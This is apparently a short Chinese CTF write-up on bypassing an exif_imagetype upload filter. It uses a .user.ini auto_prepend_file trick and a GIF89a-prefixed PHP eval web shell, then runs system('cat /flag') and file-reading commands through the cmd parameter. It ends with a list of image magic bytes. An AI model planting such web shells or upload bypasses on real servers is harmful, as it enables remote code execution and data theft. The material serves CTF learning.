# Checkin


## 1

  

常规步骤之后，上传了`.htaccess`文件，不过发现被限制了。

返回了一个：

```SQL

exif_imagetype:not image!

```

&lt;!-- more --&gt;

  

&lt;a href=https://www.php.net/manual/zh/function.exif-imagetype.php&gt;exif_imagetype函数&lt;/a&gt;

简单来说就是，上传文件白名单机制。

QAQ

新英雄登场

`.user.ini`文件

php目录配置文件，作用为：

&gt;当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。

文件内容为

```ini

GIF89a

auto_prepend_file=po.jpg

```

之后就可以常规步骤一顿操作。

  

### 2

  

这里也有了新一种方法`用传进去的cmd 进行rce`——其前提是传入的木马文件内容为：

```script

GIF89a

&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt;

```

然后

```cmd

uploads/xxx/index.php?cmd=var_dump(scandir(&#34;/&#34;)); // 扫描当前目录下的文件，并打印出来

  

uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;);

  

uploads/xxx/index.php?cmd=var_dump(file_get_contents(&#34;/flag&#34;));

```

  
  
  
  

-----

### 3

ps：图片文件头前缀（作用是？）

  

```txt

JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码）

GIF：47 49 46 38 39 61（ascll值是GIF89a）

PNG： 89 50 4E 47

  

```

  

&lt;a href=https://www.cnblogs.com/zhiliu/p/16825982.html&gt;参考一下&lt;/a&gt;

&lt;a href=https://www.cnblogs.com/cjjcn/p/13954347.html&gt;常见文件头/尾总结&lt;/a&gt;

php解析文件值得关注

&lt;hr&gt;

2024：现在看起来好肤浅的笔记……


---

> Author:   
> URL: https://66lueflam144.github.io/posts/b92f36b/  

